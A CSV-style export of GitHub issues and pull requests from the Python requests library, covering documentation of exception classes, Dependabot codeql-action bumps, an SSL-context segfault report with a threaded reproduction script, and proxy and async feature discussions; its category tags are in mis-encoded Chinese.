2825392750,docs(exceptions): Remove unused exception URLRequired from documentation,"The documentation previously listed `requests.URLRequired` as a valid exception, suggesting it would be raised for invalid URLs. However, this exception has been dead code since commit ab27027 (2012) and is never actually raised.

Instead, invalid URLs raise `MissingSchema`, `InvalidSchema`, or `InvalidURL`, none of which were documented. This commit removes `URLRequired` from the documentation to reflect the actual behavior and prevent confusion.","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6880
2825391176,docs(exceptions): Add ConnectTimeout and ReadTimeout to documentation,"Comparing `__init__.py` exported exceptions with the documentation revealed that two exceptions were missing from the docs. This commit updates the documentation to include these previously unlisted exceptions, ensuring consistency between the code and the docs.","ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6879
2825353475,Question: would a patch deferring the creation of the pre-loaded SSLContext be accepted for faster startup?,"Hi,

So I'm investigating ways to improve pip's startup time. Obviously importing a HTTP library like requests is going to be slow regardless of we do, but the deferring the SSLContext pre-loading until use is something would benefit pip. 

https://github.com/psf/requests/blob/fe0583ba49cf162e1a7fe35ae05de6a62b8372fa/src/requests/adapters.py#L77-L87

[pip manages its own SSLContext](https://github.com/pypa/pip/blob/028c087c1826fdf59d3b48266f9d647b1a08d07f/src/pip/_internal/cli/index_command.py#L28) so it can use truststore for automatic system CA support, thus we never use `_preloaded_ssl_context` on Python 3.10 or higher[^1]. Unfortunately, OpenSSL 3.x has terrible verify path/location performance: https://github.com/python/cpython/issues/95031 so the unnecessary `load_verify_locations()` call ends up eating ~15 ms on my system.

So, would a patch deferring the context creation until use be accepted? I realize this is of limited benefit for most users since they probably aren't passing their own SSLContext, so if this is too niche, I understand!

[^1]: Truststore requires Python 3.10 or higher. Also, pip's truststore integration can be disabled via `--use-deprecated=legacy-certs` but as the flag name implies, we don't really want people to be using this until necessary.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6878
2823904438,List of documented exceptions doesn't match reality / unused `URLRequired` exception,"The documentation lists a [relatively small list](https://requests.readthedocs.io/en/latest/api/#exceptions) of exceptions, among them:

> exception `requests.URLRequired(*args, **kwargs)`
> A valid URL is required to make a request.

which would imply that passing an invalid URL raises `URLRequired`. However, that exception is actually dead code and not raised anywhere ever since ab27027aa8916e6e199bbb35083beb5d6339f6aa in 2012. Instead, with requests 2.32.3, invalid URLs raise something like `MissingSchema`, `InvalidSchema` or `InvalidURL`, none of which are documented.

Looking at [exceptions.py](https://github.com/psf/requests/blob/main/src/requests/exceptions.py), there seem to be various other undocumented exceptions in there:

- `class InvalidJSONError(RequestException):` (only `JSONDecodeError` which inherits from it)
- `class ProxyError(ConnectionError):`
- `class SSLError(ConnectionError):`
- `class ConnectTimeout(ConnectionError, Timeout):` (`Timeout` is documented)
- `class ReadTimeout(Timeout):` (`Timeout` is documented)
- `class MissingSchema(RequestException, ValueError):`
- `class InvalidSchema(RequestException, ValueError):`
- `class InvalidURL(RequestException, ValueError):`
- `class InvalidHeader(RequestException, ValueError):`
- `class InvalidProxyURL(InvalidURL):`
- `class ChunkedEncodingError(RequestException):`
- `class ContentDecodingError(RequestException, BaseHTTPError):`
- `class StreamConsumedError(RequestException, TypeError):`
- `class RetryError(RequestException):`
- `class UnrewindableBodyError(RequestException):`

(Some of those might be internal, or considered not worth documenting since they can be caught by `except ValueError:`. However, even e.g. [Errors and Exceptions](https://docs.python-requests.org/en/latest/user/quickstart/#errors-and-exceptions) or the reference docs don't seem to point out that either.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6877
2814044283,Add netrc file search information to authentication documentation,"Added paragraph (copied from `quickstart.rst`) with information where Requests search for `.netrc` file.

It should make it easier to find this information when somebody reads regular documentation (as opposite to quickstart documentation).","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6876
2813548480,Bump github/codeql-action from 3.27.0 to 3.28.5,"Bumps [github/codeql-action](https://github.com/github/codeql-action) from 3.27.0 to 3.28.5.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/releases"">github/codeql-action's releases</a>.</em></p>
<blockquote>
<h2>v3.28.5</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.5 - 24 Jan 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.20.3. <a href=""https://redirect.github.com/github/codeql-action/pull/2717"">#2717</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.5/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.4</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.4 - 23 Jan 2025</h2>
<p>No user facing changes.</p>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.4/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.3</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.3 - 22 Jan 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.20.2. <a href=""https://redirect.github.com/github/codeql-action/pull/2707"">#2707</a></li>
<li>Fix an issue downloading the CodeQL Bundle from a GitHub Enterprise Server instance which occurred when the CodeQL Bundle had been synced to the instance using the <a href=""https://github.com/github/codeql-action-sync-tool"">CodeQL Action sync tool</a> and the Actions runner did not have Zstandard installed. <a href=""https://redirect.github.com/github/codeql-action/pull/2710"">#2710</a></li>
<li>Uploading debug artifacts for CodeQL analysis is temporarily disabled. <a href=""https://redirect.github.com/github/codeql-action/pull/2712"">#2712</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.3/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.2</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.2 - 21 Jan 2025</h2>
<p>No user facing changes.</p>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.2/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.1</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/blob/main/CHANGELOG.md"">github/codeql-action's changelog</a>.</em></p>
<blockquote>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>[UNRELEASED]</h2>
<p>No user facing changes.</p>
<h2>3.28.5 - 24 Jan 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.20.3. <a href=""https://redirect.github.com/github/codeql-action/pull/2717"">#2717</a></li>
</ul>
<h2>3.28.4 - 23 Jan 2025</h2>
<p>No user facing changes.</p>
<h2>3.28.3 - 22 Jan 2025</h2>
<ul>
<li>Update default CodeQL bundle version to 2.20.2. <a href=""https://redirect.github.com/github/codeql-action/pull/2707"">#2707</a></li>
<li>Fix an issue downloading the CodeQL Bundle from a GitHub Enterprise Server instance which occurred when the CodeQL Bundle had been synced to the instance using the <a href=""https://github.com/github/codeql-action-sync-tool"">CodeQL Action sync tool</a> and the Actions runner did not have Zstandard installed. <a href=""https://redirect.github.com/github/codeql-action/pull/2710"">#2710</a></li>
<li>Uploading debug artifacts for CodeQL analysis is temporarily disabled. <a href=""https://redirect.github.com/github/codeql-action/pull/2712"">#2712</a></li>
</ul>
<h2>3.28.2 - 21 Jan 2025</h2>
<p>No user facing changes.</p>
<h2>3.28.1 - 10 Jan 2025</h2>
<ul>
<li>CodeQL Action v2 is now deprecated, and is no longer updated or supported. For better performance, improved security, and new features, upgrade to v3. For more information, see <a href=""https://github.blog/changelog/2025-01-10-code-scanning-codeql-action-v2-is-now-deprecated/"">this changelog post</a>. <a href=""https://redirect.github.com/github/codeql-action/pull/2677"">#2677</a></li>
<li>Update default CodeQL bundle version to 2.20.1. <a href=""https://redirect.github.com/github/codeql-action/pull/2678"">#2678</a></li>
</ul>
<h2>3.28.0 - 20 Dec 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.15.5. <a href=""https://redirect.github.com/github/codeql-action/pull/2655"">#2655</a></li>
<li>Don't fail in the unusual case that a file is on the search path. <a href=""https://redirect.github.com/github/codeql-action/pull/2660"">#2660</a>.</li>
</ul>
<h2>3.27.9 - 12 Dec 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.8 - 12 Dec 2024</h2>
<ul>
<li>Fixed an issue where streaming the download and extraction of the CodeQL bundle did not respect proxy settings. <a href=""https://redirect.github.com/github/codeql-action/pull/2624"">#2624</a></li>
</ul>
<h2>3.27.7 - 10 Dec 2024</h2>
<ul>
<li>We are rolling out a change in December 2024 that will extract the CodeQL bundle directly to the toolcache to improve performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2631"">#2631</a></li>
<li>Update default CodeQL bundle version to 2.20.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2636"">#2636</a></li>
</ul>
<h2>3.27.6 - 03 Dec 2024</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/github/codeql-action/commit/f6091c0113d1dcf9b98e269ee48e8a7e51b7bdd4""><code>f6091c0</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2721"">#2721</a> from github/update-v3.28.5-01f001931</li>
<li><a href=""https://github.com/github/codeql-action/commit/064af10f0de41995b41632364b4bfb00a34df047""><code>064af10</code></a> Update changelog for v3.28.5</li>
<li><a href=""https://github.com/github/codeql-action/commit/01f0019310ce544d1cf748667a69f8fd6e26e48a""><code>01f0019</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2717"">#2717</a> from github/update-bundle/codeql-bundle-v2.20.3</li>
<li><a href=""https://github.com/github/codeql-action/commit/573ad887cd5b527e9baef02653bd455e1ff5181c""><code>573ad88</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2718"">#2718</a> from github/kaeluka/4779-1</li>
<li><a href=""https://github.com/github/codeql-action/commit/d7f39764f685cbe3764f763469a0d72383d7b9c8""><code>d7f3976</code></a> permissions block in query-filters.yml</li>
<li><a href=""https://github.com/github/codeql-action/commit/428975ce2cf327a0e919004c63e734eddd0e6255""><code>428975c</code></a> Add changelog note</li>
<li><a href=""https://github.com/github/codeql-action/commit/208091da0a1069394981cdf5e7a91a8ee3f10709""><code>208091d</code></a> Update default bundle to codeql-bundle-v2.20.3</li>
<li><a href=""https://github.com/github/codeql-action/commit/7e3036b9cd87fc26dd06747b7aa4b96c27aaef3a""><code>7e3036b</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2716"">#2716</a> from github/mergeback/v3.28.4-to-main-ee117c90</li>
<li><a href=""https://github.com/github/codeql-action/commit/e32a0d62d44ac06377953bfaf3ffd43618be076a""><code>e32a0d6</code></a> Update checked-in dependencies</li>
<li><a href=""https://github.com/github/codeql-action/commit/67c21e4084d5e020fbc969b839d42911b87fb8b5""><code>67c21e4</code></a> Update changelog and version after v3.28.4</li>
<li>Additional commits viewable in <a href=""https://github.com/github/codeql-action/compare/662472033e021d55d94146f66f6058822b0b39fd...f6091c0113d1dcf9b98e269ee48e8a7e51b7bdd4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=github/codeql-action&package-manager=github_actions&previous-version=3.27.0&new-version=3.28.5)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",é«˜,https://github.com/psf/requests/pull/6875
2811830810,Async requests through aget/apost/â€¦ methods,"Hello, I do know that â€˜Requests is not accepting feature requests at this time.Â´ but Iâ€™d still like to propose something, and be willing to implement it myself if it actually sounds like a decent feature.

It is true that Requests is usually the way to go, and itâ€™s KISS api make it imo the best choice for either small scripts or complex projects, so I totally understand the will to keep it as-is. However, there is one thing that is still not available, and it is async support.

Iâ€™ve seen this has been quite discussed in #1390, and itâ€™s currently recommend to use grequests for async operations. But I think this library could actually provide async support in a more straightforward way:
- `aget`, `apost`, `apatch` etc methods could be provided, so the existing method wouldnâ€™t change, but calling those would return a coroutine instead. Most of the logic would stay the same, only the http calls would be asynchronous. This is similar to [how async db operations have been added to Django](https://docs.djangoproject.com/en/5.1/topics/async/#queries-the-orm): `All QuerySet methods that cause an SQL query to occur have an a-prefixed asynchronous variant.`
- Those would use [urllib3.future](https://urllib3future.readthedocs.io/en/latest/index.html), if not available an exception would get raised. As such, we are still fully compatible with existing dependencies for synchronous operations, [urllib3.future](https://urllib3future.readthedocs.io/en/latest/index.html) is only needed if the new async methods are used.

I do know the chances of this feature getting accepted are pretty low, even so considering that it would rely on [urllib3.future](https://urllib3future.readthedocs.io/en/latest/index.html), so:
- If this sounds actually decent, I can provide a basic PoC and iterate on it
- Otherwise Iâ€™ll just fork Requests with that feature as I still think that would be helpful to enough people

Thanks
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6874
2806633183,change in test_requests.py,add some changes in file line from 707,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6873
2793520011,Requests v2.32.0-v2.32.3 caused a segmentation fault with multiple simultaneous requests with a certificate.,"We are having intermittent segmentation faults on requests (using requests v2.32.0-v2.32.3, urllib3 v1.26.19).  On investigation with faulthandler, they occur when a certificate is passed in, and two separate threads are trying to access the same ssl_context at the same time - one updating it with the given cert, one reading:

```
Current thread 0x00007f46c114d700 (most recent call first):
  File ""<library path>/site-packages/urllib3/util/ssl_.py"", line 418 in ssl_wrap_socket
  File ""<library path>/site-packages/urllib3/connection.py"", line 419 in connect
  File ""<library path>/site-packages/urllib3/connectionpool.py"", line 1060 in _validate_conn
  File ""<library path>/site-packages/urllib3/connectionpool.py"", line 404 in _make_request
  File ""<library path>/site-packages/urllib3/connectionpool.py"", line 715 in urlopen
  File ""<library path>/site-packages/requests/adapters.py"", line 667 in send
  File ""<library path>/site-packages/requests/sessions.py"", line 703 in send
  File ""<library path>/site-packages/requests/sessions.py"", line 589 in request
  File ""<library path>/site-packages/requests/sessions.py"", line 602 in get
  ...

Thread 0x00007f469e7fc700 (most recent call first):
  File ""/usr/ssl.py"", line 1382 in do_handshake
  File ""/usr/ssl.py"", line 1104 in _create
  File ""/usr/ssl.py"", line 517 in wrap_socket
  File ""<library path>/site-packages/urllib3/util/ssl_.py"", line 493 in _ssl_wrap_socket_impl
  File ""<library path>/site-packages/urllib3/util/ssl_.py"", line 449 in ssl_wrap_socket
  File ""<library path>/site-packages/urllib3/connection.py"", line 419 in connect
  File ""<library path>/site-packages/urllib3/connectionpool.py"", line 1060 in _validate_conn
  File ""<library path>/site-packages/urllib3/connectionpool.py"", line 404 in _make_request
  File ""<library path>/site-packages/urllib3/connectionpool.py"", line 715 in urlopen
  File ""<library path>/site-packages/requests/adapters.py"", line 667 in send
  File ""<library path>/site-packages/requests/sessions.py"", line 703 in send
  File ""<library path>/site-packages/requests/sessions.py"", line 589 in request
  File ""<library path>/site-packages/requests/sessions.py"", line 602 in get
  ...
```

This seems to happen because requests v2.32 switched from having a request without an SSL context create a new one to using the same preloaded SSL context across multiple requests.  (This is https://github.com/psf/requests/issues/6745 with more information as to what exactly is going on - opening a new issue as the original issue creator has left the company.) 

## Expected Result

No segmentation faults.

## Actual Result

Got intermittent segmentation faults.

## Reproduction Steps

As per the original issue - and note that it _only_ crashes if a generated certificate is passed in -  `openssl req -x509 -newkey rsa:4096 -keyout client.key -out client.crt -days 365 -nodes`:

```
import concurrent.futures
import random
import uuid
from threading import Thread
from time import time

import requests


def do_request():
    start = time()
    random_id = uuid.uuid4()
    delay = random.randint(1, 5)
    print(""start {} delay {} seconds"".format(random_id, delay))
    endpoints = []
    endpoints.append('https://httpbin.org/delay/' + str(delay))
    delay = str(random.randint(1, 5)) + 's'
    endpoints.append('https://run.mocky.io/v3/0432e9f0-674f-45bd-9c18-628b861c2258?mocky-delay=' + str(delay))
    random.shuffle(endpoints)
    response = None
    for endpoint in endpoints:
        try:
            print(""start {} delay {} seconds"".format(random_id, endpoint))
            if 'run' in endpoint:
                cert = './client.crt', './client.key'
                response = requests.get(endpoint, timeout=random.randint(1, 5), cert=cert)
            else:
                response = requests.get(endpoint, timeout=random.randint(1, 5))
        except Exception as e:
            print(e)
    end = time()


    print(""finished {} in {} seconds"".format(random_id, end - start))
    return response


def measure():
    cnt = 20
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for server in range(1, cnt):
            futures.append(executor.submit(do_request))
        for future in concurrent.futures.as_completed(futures):
            pass


for i in range(1, 500):
    threads = [Thread(target=measure, args=()) for _ in range(5)]

    for t in threads: t.start()
    for t in threads: t.join()
```

## System Information

```
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": ""43.0.1""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.11""
  },
  ""platform"": {
    ""release"": ""4.18.0-553.34.1.el8_10.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30300020"",
    ""version"": ""24.2.1""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""101010bf""
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```

(Attempted with requests v2.32.0, v2.32.2, v2.32.3, urllib3 v1.26.18, v1.26.19.)
 ","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6872
2788894297,"""I use the same proxy for requests to 300 websites from china, and httpx and requests behave completely differently.""","same code ,same proxies!
success rate verry diffrrence

this is requests success rate!

<img width=""988"" alt=""image"" src=""https://github.com/user-attachments/assets/8e3c3338-c71b-4818-8d59-1e2a339f1738"" />
<img width=""1209"" alt=""image"" src=""https://github.com/user-attachments/assets/6f791157-e544-4d4c-a213-7d1839c69194"" />

this is httpx success rate!
<img width=""1073"" alt=""image"" src=""https://github.com/user-attachments/assets/533fd631-a090-4851-9fbe-974629d66b2e"" />


I am a user from China. I suspect that when using a proxy with requests, the process of obtaining the DNS IP does not go through the proxy, or it directly uses the system's DNS to obtain the IP. At this point, it has already been intercepted by the Great Firewall of China, leading to the retrieval of an incorrect IP and ultimately causing a SOCKSHTTP timeout. However, httpx does not have this issue. I think it might be a bug in requests, but I can't find the cause. I also don't know how to fix it.

Since our project extensively uses the requests library, we cannot quickly switch to httpx. I hope you can help me solve this bug. We have debugged up to the point of establishing the SOCKS connection and found that both are the same, but the final success rates are completely different. httpx can achieve a 90% success rate, while requests only reaches a 20% success rate.

I would prefer to know and fix this bug.
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",é«˜,https://github.com/psf/requests/issues/6871
2784575051,Bump github/codeql-action from 3.27.0 to 3.28.1,"Bumps [github/codeql-action](https://github.com/github/codeql-action) from 3.27.0 to 3.28.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/releases"">github/codeql-action's releases</a>.</em></p>
<blockquote>
<h2>v3.28.1</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>3.28.1 - 10 Jan 2025</h2>
<ul>
<li>CodeQL Action v2 is now deprecated, and is no longer updated or supported. For better performance, improved security, and new features, upgrade to v3. For more information, see <a href=""https://github.blog/changelog/2025-01-10-code-scanning-codeql-action-v2-is-now-deprecated/"">this changelog post</a>. <a href=""https://redirect.github.com/github/codeql-action/pull/2677"">#2677</a></li>
<li>Update default CodeQL bundle version to 2.20.1. <a href=""https://redirect.github.com/github/codeql-action/pull/2678"">#2678</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.1/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.28.0</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.28.0 - 20 Dec 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.15.5. <a href=""https://redirect.github.com/github/codeql-action/pull/2655"">#2655</a></li>
<li>Don't fail in the unusual case that a file is on the search path. <a href=""https://redirect.github.com/github/codeql-action/pull/2660"">#2660</a>.</li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.0/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.27.9</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.27.9 - 12 Dec 2024</h2>
<p>No user facing changes.</p>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.27.9/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.27.7</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.27.7 - 10 Dec 2024</h2>
<ul>
<li>We are rolling out a change in December 2024 that will extract the CodeQL bundle directly to the toolcache to improve performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2631"">#2631</a></li>
<li>Update default CodeQL bundle version to 2.20.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2636"">#2636</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/blob/main/CHANGELOG.md"">github/codeql-action's changelog</a>.</em></p>
<blockquote>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<h2>[UNRELEASED]</h2>
<p>No user facing changes.</p>
<h2>3.28.1 - 10 Jan 2025</h2>
<ul>
<li>CodeQL Action v2 is now deprecated, and is no longer updated or supported. For better performance, improved security, and new features, upgrade to v3. For more information, see <a href=""https://github.blog/changelog/2025-01-10-code-scanning-codeql-action-v2-is-now-deprecated/"">this changelog post</a>. <a href=""https://redirect.github.com/github/codeql-action/pull/2677"">#2677</a></li>
<li>Update default CodeQL bundle version to 2.20.1. <a href=""https://redirect.github.com/github/codeql-action/pull/2678"">#2678</a></li>
</ul>
<h2>3.28.0 - 20 Dec 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.15.5. <a href=""https://redirect.github.com/github/codeql-action/pull/2655"">#2655</a></li>
<li>Don't fail in the unusual case that a file is on the search path. <a href=""https://redirect.github.com/github/codeql-action/pull/2660"">#2660</a>.</li>
</ul>
<h2>3.27.9 - 12 Dec 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.8 - 12 Dec 2024</h2>
<ul>
<li>Fixed an issue where streaming the download and extraction of the CodeQL bundle did not respect proxy settings. <a href=""https://redirect.github.com/github/codeql-action/pull/2624"">#2624</a></li>
</ul>
<h2>3.27.7 - 10 Dec 2024</h2>
<ul>
<li>We are rolling out a change in December 2024 that will extract the CodeQL bundle directly to the toolcache to improve performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2631"">#2631</a></li>
<li>Update default CodeQL bundle version to 2.20.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2636"">#2636</a></li>
</ul>
<h2>3.27.6 - 03 Dec 2024</h2>
<ul>
<li>Update default CodeQL bundle version to 2.19.4. <a href=""https://redirect.github.com/github/codeql-action/pull/2626"">#2626</a></li>
</ul>
<h2>3.27.5 - 19 Nov 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.4 - 14 Nov 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.3 - 12 Nov 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.2 - 12 Nov 2024</h2>
<ul>
<li>Fixed an issue where setting up the CodeQL tools would sometimes fail with the message &quot;Invalid value 'undefined' for header 'authorization'&quot;. <a href=""https://redirect.github.com/github/codeql-action/pull/2590"">#2590</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/github/codeql-action/commit/b6a472f63d85b9c78a3ac5e89422239fc15e9b3c""><code>b6a472f</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2681"">#2681</a> from github/update-v3.28.1-ea6acbfea</li>
<li><a href=""https://github.com/github/codeql-action/commit/bb999b434f581db70696c32bf01941ec0391c3cb""><code>bb999b4</code></a> Update changelog for v3.28.1</li>
<li><a href=""https://github.com/github/codeql-action/commit/ea6acbfeae40310725526bdaea16fb48c1f62be0""><code>ea6acbf</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2677"">#2677</a> from github/angelapwen/deprecate-action-v2</li>
<li><a href=""https://github.com/github/codeql-action/commit/4df151edec34bbfb2f213ed8b2dc74363baa69ca""><code>4df151e</code></a> Merge branch 'main' into angelapwen/deprecate-action-v2</li>
<li><a href=""https://github.com/github/codeql-action/commit/a05a7eb09cb4faebee87507a854cbd429fbe6bc6""><code>a05a7eb</code></a> Fix PR number in changenote</li>
<li><a href=""https://github.com/github/codeql-action/commit/8d2753b250830f4073d10fc13a3264a17ba82a20""><code>8d2753b</code></a> Add public changelog blog post link</li>
<li><a href=""https://github.com/github/codeql-action/commit/e83e0a4f58f2ca25f7dd222e8689519a74bf26fc""><code>e83e0a4</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2673"">#2673</a> from github/dependabot/npm_and_yarn/npm-877f465710</li>
<li><a href=""https://github.com/github/codeql-action/commit/b7ff30899f3f4aa6705d70c1456d7189e1b320ba""><code>b7ff308</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2678"">#2678</a> from github/update-bundle/codeql-bundle-v2.20.1</li>
